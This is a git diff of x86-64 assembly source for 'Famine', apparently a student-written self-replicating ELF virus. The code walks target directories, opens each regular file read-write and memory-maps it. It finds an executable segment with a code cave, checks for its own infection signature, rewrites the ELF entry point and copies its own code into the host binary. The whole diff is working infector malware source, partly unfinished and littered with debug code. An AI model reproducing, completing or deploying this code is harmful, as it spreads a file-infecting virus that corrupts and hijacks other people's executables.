@@ -6,200 +6,278 @@ default rel
 section .text
 global _start
 
-
 _start:
 
     ; placing famine on the stack
     mov rbp, rsp
-    sub rsp, famine_size
-    mov rdi, dir1                               ; dir to open for arg readDir
+    mov rdi, dir1                                   ; dir to open for arg readDir
+    mov rsi, dir1Len
+    call _readDir
+
+    ; debug
+    writeBack
+    mov rsi, tiret
+    writeWork
+    writeBack
+    writeBack
+
+    mov rdi, dir2
+    mov rsi, dir2Len
     call _readDir
     jmp _exit
 
-; take directory to open in rdi
+; take directory to open in rdi && size of pwd on rsi
 _readDir:
+    push rbp
+    mov rbp, rsp
+    sub rsp, famine_size
+    lea r8, FAM(famine.pwdPtr)
+    mov [r8], rdi
+    lea r8, FAM(famine.lenghtPwd)
+    mov [r8], rsi
     mov rax, SYS_OPEN 
     mov rsi, O_RDONLY | O_DIRECTORY
     xor rdx, rdx
     syscall
     cmp rax, 0
     jl _exit
+    lea rdi, FAM(famine.fd)                         ; enregistre le fd dans la struct
+    mov [rdi], rax
 
-    mov rdi, rax
-    mov rax, SYS_GETDENTS                   	; getdents64(int fd, void *buf, size_t size_buf)
-    lea rsi, FAM(famine.dirents)
-    mov rdx, PAGE_SIZE
-    syscall
-    lea r10, FAM(famine.dirents_struct_ptr) 	; r10 -> (struct famine.diretents_struct_ptr)
-    mov [r10], rsi          	                ; famine.dirents_struct_ptr -> famine.dirents
-    lea r11, FAM(famine.total_to_read)      	; r11 -> (struct famine.total_to_read)
-    mov DWORD [r11], eax                        ; famine.total_to_read = getdents total length
-    cmp rax, 0
-    jle _return
+    _getDents:
+        lea r10, FAM(famine.fd)
+        mov rdi, [r10]
+        lea r9, FAM(famine.total_read)              ; init total_read
+        mov DWORD[r9], 0
+        mov rax, SYS_GETDENTS                   	; getdents64(int fd, void *buf, size_t size_buf)
+        lea rsi, FAM(famine.dirents)
+        mov rdx, PAGE_SIZE
+        syscall
+        cmp rax, 0
+        jle _returnReadir
+
+        lea r10, FAM(famine.dirents_struct_ptr) 	; r10 -> (struct famine.diretents_struct_ptr)
+        mov [r10], rsi          	                ; famine.dirents_struct_ptr -> famine.dirents
+        lea r11, FAM(famine.total_to_read)      	; r11 -> (struct famine.total_to_read)
+        mov DWORD [r11], eax                        ; famine.total_to_read = getdents total length
 
     _listFile:
-        lea r8, FAM(famine.total_read)      	; r8 -> total lu de getdents
-        lea r9, FAM(famine.total_to_read)       ; r9 -> total a lire de getdents
-        mov r10, FAM(famine.dirents_struct_ptr) ; r10 -> actual dirent struct
-        lea r11, FAM(famine.dirents_struct_ptr) ; r11 -> ptr de la struct actuelle
-        movzx r12, WORD [r10 + D_RECLEN_OFF] 	; r12 = length de la stuct dirents actuelle
-        add [r8], r12d                        	; update du total lu dans r8
-        add [r11], r12                          ; famine.diretns_struct_ptr -> sur la prochaine struct
-        cmp BYTE [r10 + D_TYPE], D_REG_FILE 	; verifie le type du fichier
+        lea r8, FAM(famine.total_read)      		; r8 -> total lu de getdents
+        lea r9, FAM(famine.total_to_read)       	; r9 -> total a lire de getdents
+        mov r10, FAM(famine.dirents_struct_ptr) 	; r10 -> actual dirent struct
+        lea r11, FAM(famine.dirents_struct_ptr) 	; r11 -> ptr de la struct actuelle
+        movzx r12, WORD [r10 + D_RECLEN_OFF] 		; r12 = length de la stuct dirents actuelle
+        add [r8], r12d                        		; update du total lu dans r8
+        add [r11], r12                          	; famine.diretns_struct_ptr -> sur la prochaine struct
+        cmp BYTE [r10 + D_TYPE], D_REG_FILE 		; verifie le type du fichier
         jne _checkRead
-        lea rsi, [r10 + D_NAME]                 ; charge le nom du fichier dans rsi
-		call _check_file
 
-            _checkRead:
-                mov r8, FAM(famine.total_read)
-                mov r12, FAM(famine.total_to_read)
-                cmp r8d, r12d                 	; if (total lu >= total getdents)
-                jge _return
-                jmp _listFile
+        _updatePath:
+            lea rsi, [r10 + D_NAME]                 	; charge le nom du fichier dans rsi
+            mov byte [rsi - 1], '/'
+            sub rsi, FAM(famine.lenghtPwd)
+            mov rdi, FAM(famine.pwdPtr)
+            call _strcpy
+
+            ;debug
+            writeWork
+            writeBack
+            
+            ;met ta fonction ici
+			_bf_chk_file:
+			call _check_file
+
+        _checkRead:
+            mov r8, FAM(famine.total_read)
+            mov r12, FAM(famine.total_to_read)
+            cmp r8d, r12d                 		; if (total lu >= total getdents)
+            jge _getDents
+            jmp _listFile
 
 _check_file:
 	push rbp
 	mov	rbp, rsp
-    sub rsp, check_file_size
+	sub rsp, infection_size
 
-	; === open file ===
 	_open_file:
 		mov	rax, SYS_OPEN
 		mov rdi, rsi
-		; lea	rdi, [rel file_name]
 		mov rsi, O_RDWR
 		xor rdx, rdx 
 		syscall
 		cmp	rax, 0x0
 		jl	_leave_return
-		mov CHF(check_file.file_fd), rax
+		mov INF(infection.file_fd), rax
 
 	; === get file size ===
 	_get_filesz:
 		mov rax, SYS_LSEEK
-		mov	rdi, CHF(check_file.file_fd)
+		mov	rdi, INF(infection.file_fd)
 		mov	rsi, 0x0
 		mov rdx, SEEK_END
 		syscall
-		; mov r10, rax
-		; mov rax, SYS_LSEEK
-		; mov rdx, SEEK_SET
-		; syscall
+		cmp rax, 0x0
+		jle _close_file
 
-	; === mmap file ===
 	_map_file:
-		mov rsi, rax			; rsi = file_size
+	; *rax -> map
+		mov rsi, rax								; rsi = file_size
 		mov rax, SYS_MMAP
 		mov	rdi, 0x0
 		mov rdx, PROT_READ | PROT_WRITE | PROT_EXEC
 		mov r10, MAP_SHARED
-		mov r8, CHF(check_file.file_fd)
+		mov r8, INF(infection.file_fd)
 		mov r9, 0x0
 		syscall
-		cmp	rax, 0x0
-		jl _leave_return
-		mov CHF(check_file.map), rax		; voir si necessaire
+		cmp	rax, 0x0								; rax -> map (used later)
+		jl _checkRead
+		; jl _leave_return
 
-	; === check file format ===
 	_check_format:
-		cmp	dword [rax + 1], 0x02464c45	; if != 'ELF64'
-		jne _leave_return
+		cmp	dword [rax + 1], 0x02464c45				; if != 'ELF64'
+		; jne _leave_return
+		jne _checkRead
 
-	; === Find text segment ===
-	_find_txt_seg:
-		mov r14, rax								; rax -> elf start addr (needed for injection)
-		movzx r15, word [r14 + elf64_ehdr.e_phnum]	; r15 = number of segments
+	_find_text_seg:
+	;*rax	-> map
+	;*r14	-> header table
+		mov r14, rax								; r14 -> elf start addr
 		add r14, [r14 + elf64_ehdr.e_phoff]			; r14 -> start of segment headers's table
+		movzx r15, word [rax + elf64_ehdr.e_phnum]	; r15 = number of segments (see _segment_loop)
 		xor rcx, rcx								; loop counter
-	; === run through segments ===
-	_segment_loop:
+	
+	_segment_loop:		; while (cx != r15){check segment p_type & p_flags & cave_size; rcx++ & phdr++}
+	;*r14	-> segment header
+	; r15	== segment number
+	; rcx	-> segment index counter
 		cmp r15w, cx
-		je	_leave_return
-		bt word [r14], 0					; segment is loadable
+		; je	_leave_return
+		je _checkRead
+		bt word [r14], 0							; segment is loadable (bit test r14's first bit)
 		jnc _continue
-		bt qword [r14], 0x20				; segment is executable (test the 32nd bit of r14)
+		bt qword [r14], 0x20						; segment is executable (bit test r14's 33rd bit)
 		jc _check_cave_size
 		_continue:
 		inc rcx
-		add r14, elf64_phdr_size			; r14 -> next_phdr(.p_type) (needed later)
+		add r14, elf64_phdr_size					; r14 -> next_phdr(.p_type) (needed later)
 		jmp _segment_loop
 
 		_check_cave_size:
 			mov r13, r14
-			add r13, elf64_phdr_size				; r13 -> next_phdr(.p_type)
-			add r13, elf64_phdr.p_offset			; r13 -> next_phdr.offset
-			mov rbx, [r14 + elf64_phdr.p_offset]
+			add r13, elf64_phdr_size + elf64_phdr.p_offset		; r13 -> next_phdr.offset
+			mov rbx, [r14 + elf64_phdr.p_offset]	; rbx = curr_phdr.offset
 			add rbx, [r14 + elf64_phdr.p_filesz]
 			add rbx, CODE_LEN						; rbx = offset end of futur parasite
-			cmp [r13], rbx
+			cmp [r13], rbx							; if (next_phdr.offset <= offset_end_parasite)
 			jle	_segment_loop
 
 	; === found text segment ===
 	_valid_seg_found:
-		mov r13, r14								; r13 -> curr_phdr
-		add r13, [r14 + elf64_phdr.p_filesz]		; jmp to end of the segment
-		add r13, CODE_LEN
-		sub r13, _end - signature					; jmp to potential signature
+	; r13	-> signature
+	;*r14	-> segment header
+	; r15	-> potential signature
+	; === check if infected (read signature) ===
+		mov r15, r14								; r15 -> curr_phdr
+		add r15, [r14 + elf64_phdr.p_filesz]		; r15 -> end curr_seg
+		add r15, CODE_LEN
+		sub r15, _end - signature					; r15 -> start of potential signature
+		lea r13, signature
+		mov r13, [r13]								; r13 = signature[8]
+		cmp r13, qword [r15]						; strncmp(signature, (char *)r15, 8);
+		; je	_leave_return
+		je _checkRead
 		
-	; === check if infected ===
-		lea r12, signature
-		mov r12, [r12]
-		cmp r12, qword [r13]
-		je	_leave_return
-		
-	; === Infection ===
-	_infection:
-		; === copy parasite ===
-		mov r13, rax							; rbx -> start of map
-		; === update headers === 
-		add r13, [r14 + elf64_phdr.p_offset]	; rbx -> start of segment
-		add r13, [r14 + elf64_phdr.p_filesz]	; jmp to end of the segment
-		mov r12, rax
-		add r12, elf64_ehdr.e_entry 			; r12 -> ehdr.e_entry
-		mov r11, [r12]							; r11 = entrypoint (we save r12 for later)
-		mov CHF(check_file.base_entry), r11
-		mov r11, r13							; r11 -> end of curr_segment
-		sub r11, rax 							; r11 = injection offset
-		mov [r12], r11
-		sub rax, elf64_ehdr.e_entry
-		; === copy parasite ===
-		push rcx
-		xor rcx, rcx
-		mov rdi, r13							; rdi -> end of curr_seg(start of injection)
-		lea rsi, [rel _start]					; rsi -> start of our code
-		mov rcx, CODE_LEN
-		cld										; copy from _start to _end (= !std)
-		rep movsb
-		_end_copy:	; debug
+_infection:
+;*rax	-> map
+; r11	== entrypoint offset 
+; r12	-> ehdr.e_entry 
+; r13	== original entrypoint offset
+;*r14	-> segment header
+; r15	-> segment end
+	mov r15, rax							; r15 -> start of map
+	add r15, [r14 + elf64_phdr.p_offset]	; r15 -> start of segment
+	add r15, [r14 + elf64_phdr.p_filesz]	; r15 -> end of the segment
+	; === stock original entrypoint === 
+	mov r12, rax
+	add r12, elf64_ehdr.e_entry 			; r12 -> ehdr.e_entry
+	mov r13, [r12]							; r13 = original entry offset (we save r12 for later)
+	; === update entrypoint to parasite offset ===
+	mov r11, r15							; r11 -> end of curr_segment
+	sub r11, rax 							; r11 = injection offset
+	mov [r12], r11							; ehdr.e_entry = injection offset
+	; === update jmp end parasite ===
+	; === copy parasite ===
+	mov rdi, r15							; rdi -> end of curr_seg(start of injection)
+	lea rsi, [rel _start]					; rsi -> start of our code
+	xor rcx, rcx
+	mov rcx, CODE_LEN						; counter will decrement
+	cld										; copy from _start to _end (= !std)
+	rep movsb
+	_end_copy:	; debug
+	; jmp _leave_return
+	jmp _checkRead
 
-		pop rcx	
-		jmp _leave_return
-	; *** pas obligatoire ***
-	_close_file:
-		mov	rax, qword 0x3
-		mov	rdi, CHF(check_file.file_fd)
-		syscall
-		jmp _leave_return
+; *** pas obligatoire ***
+_close_file:
+	mov	rax, qword 0x3
+	mov	rdi, FAM(famine.fd)
+	syscall
+	; jmp _leave_return
+	jmp _checkRead
 
-; _cpy_code:
-; 	mov rcx, CODE_LEN
-; 	rep movsb
-; 	jmp _copy_code_end
+_returnReadir:
+    mov rax, SYS_CLOSE
+    mov rdi, FAM(famine.fd)
+    syscall
+    leave
+    ret
 
 _leave_return:
 	leave
 	ret
-
-_return:
-    ret
 
 _exit:
     mov rax, 60
     xor rdi, rdi
     syscall
 
-dir1        db  "../test", 0
-open        db  "It worked", 10, 0
-file_name	db	"sample64", 0x0
+;strcpy(dst:rsi src: rdi) (without /0 at the end)
+_strcpy:
+	xor rcx, rcx
+	strcpy_loop:
+		cmp byte [rdi + rcx], 0
+		je	strcpy_loop_end
+		mov al, byte [rdi + rcx]
+		mov [rsi + rcx], al
+		add rcx, 1
+		jmp strcpy_loop
+
+	strcpy_loop_end:
+		; mov byte [rsi + rcx], 0
+		ret
+
+; debug
+; strlen(str:rsi)
+_strlen:
+	xor rcx, rcx
+	
+	ft_strlen_loop:
+		cmp	byte [rsi + rcx], 0
+		je	ft_strlen_end
+		inc rcx
+		jmp	ft_strlen_loop
+
+	ft_strlen_end:
+		mov rax, rcx
+		ret
+
+dir1        db  "test", 0
+dir1Len    equ $ - dir1
+dir2        db  "test/OK", 0
+dir2Len    equ $ - dir2
 signature	db	"Famine version 1.0 (c)oded by anvincen-eedy", 0x0
+
+;debug
+tiret       db  "..---..",0
+back        db  10, 0
 _end:
